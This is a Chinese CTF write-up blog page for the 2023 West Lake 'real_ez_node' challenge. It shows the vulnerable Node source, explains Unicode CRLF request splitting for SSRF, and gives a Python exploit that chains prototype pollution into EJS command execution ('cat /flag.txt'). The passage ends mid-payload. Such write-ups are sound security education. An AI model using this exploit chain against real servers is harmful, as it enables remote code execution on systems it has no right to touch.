@@ -1,0 +1,714 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    西湖论剑2023部分复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="real_ez_node(CRLF注入+原型链污染+ejs模板注入) 西湖论剑·2022中国杭州网络安全技能大赛 部分WriteUp-先知社区 西湖论剑 2023 比赛复现_real ez node-CSDN博客 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:type" content="article">
+<meta property="og:title" content="西湖论剑2023部分复现">
+<meta property="og:url" content="http://example.com/2025/12/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="real_ez_node(CRLF注入+原型链污染+ejs模板注入) 西湖论剑·2022中国杭州网络安全技能大赛 部分WriteUp-先知社区 西湖论剑 2023 比赛复现_real ez node-CSDN博客 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/12/08/images/web1.png">
+<meta property="article:published_time" content="2025-12-08T09:50:14.000Z">
+<meta property="article:modified_time" content="2026-04-18T08:07:16.136Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/12/08/images/web1.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="西湖论剑2023部分复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">西湖论剑2023部分复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#real_ez_nodecrlf%E6%B3%A8%E5%85%A5%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93ejs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> real_ez_node(CRLF注入+原型链污染+ejs模板注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AD%E8%BD%AC%E4%B9%BE%E5%9D%A4tomcat%E5%92%8Capache%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82"><span class="toc-number">2.</span> <span class="toc-text"> 扭转乾坤(tomcat和apache解析差异)</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-西湖论剑2023部分复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/12/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-12-08T09:50:14.000Z" itemprop="datePublished">2025-12-08</time>
+    <time style="display: none;" id="post-update-time">2026-04-18</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="real_ez_nodecrlf注入原型链污染ejs模板注入"><a class="markdownIt-Anchor" href="#real_ez_nodecrlf注入原型链污染ejs模板注入"></a> real_ez_node(CRLF注入+原型链污染+ejs模板注入)</h2>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11574">西湖论剑·2022中国杭州网络安全技能大赛 部分WriteUp-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/128985484">西湖论剑 2023 比赛复现_real ez node-CSDN博客</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);<span class="comment">//解析,用req.body获取post参数</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  secret : <span class="string">&#x27;secret&#x27;</span>, <span class="comment">// 对session id 相关的cookie 进行签名</span></span><br><span class="line">  resave : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>, <span class="comment">// 是否保存未初始化的会话</span></span><br><span class="line">  cookie : &#123;</span><br><span class="line">    maxAge : <span class="number">1000</span> * <span class="number">60</span> * <span class="number">3</span>, <span class="comment">// 设置 session 的有效时间，单位毫秒</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123;    // 设置使用 ejs 模板引擎 </span></span><br><span class="line"><span class="comment">//   fs.readFile(filePath, (err, content) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//       if (err) return callback(new Error(err))</span></span><br><span class="line"><span class="comment">//       let compiled = lodash.template(content)    // 使用 lodash.template 创建一个预编译模板方法供后面使用</span></span><br><span class="line"><span class="comment">//       let rendered = compiled()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//       return callback(null, rendered)</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, index);</span><br><span class="line"><span class="comment">// app.use(&#x27;/challenge7&#x27;, challenge7);</span></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">message</span> = err.<span class="property">message</span>;</span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">error</span> = req.<span class="property">app</span>.<span class="title function_">get</span>(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">status</span> || <span class="number">500</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br><span class="line">routes/index.<span class="property">js</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// 任何 2xx 状态码都表示成功响应，但这里只检查 200。</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// 消费响应数据以释放内存</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+<p>一眼猜到要用 <code>/curl</code> 路由来构造 <strong>SSRF</strong> 打 <code>/copy</code> 路由下的 <strong>原型链污染</strong>，当然还差个 RCE，但是貌似源码里没找到</p>
+<p>先看看咋打 <strong>SSRF</strong>，这里要 POST /copy 的话很明显需要<strong>请求拆分</strong></p>
+<p>查了下 <code>http.get</code>，参考 <a target="_blank" rel="noopener" href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting</a></p>
+<p>发现在 nodejs&lt;=8 的情况下存在 Unicode 字符损坏导致的 HTTP 拆分攻击，nodejs 不会对这些 Unicode 进行编码转义，因为它们不是 HTTP 控制字符</p>
+<p><code>\u&#123;010D&#125;\u&#123;010A&#125;</code> 这样的 string 被编码为 latin1 之后就只剩下了 <code>\r\n</code>，于是就能用来做请求拆分了</p>
+<p>触发条件是：</p>
+<blockquote>
+<p>The behaviour has been fixed in the recent Node.js 10 release, which will throw an error if the request path contains non-ascii characters. But for Node.js versions 8 or lower, any server that makes outgoing HTTP requests may be vulnerable to an SSRF via request splitting if it:</p>
+<ul>
+<li>Accepts unicode data from from user input, and</li>
+<li>Includes that input in the request path of an outgoing HTTP request, and</li>
+<li>The request has a zero-length body (such as a GET or DELETE).</li>
+</ul>
+</blockquote>
+<p>然后看到一道题就用到了 <a target="_blank" rel="noopener" href="https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501">NodeJS SSRF by Response Splitting — ASIS CTF Finals 2018 — Proxy-Proxy Question Walkthrough</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 159</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag.txt&#x27;);var 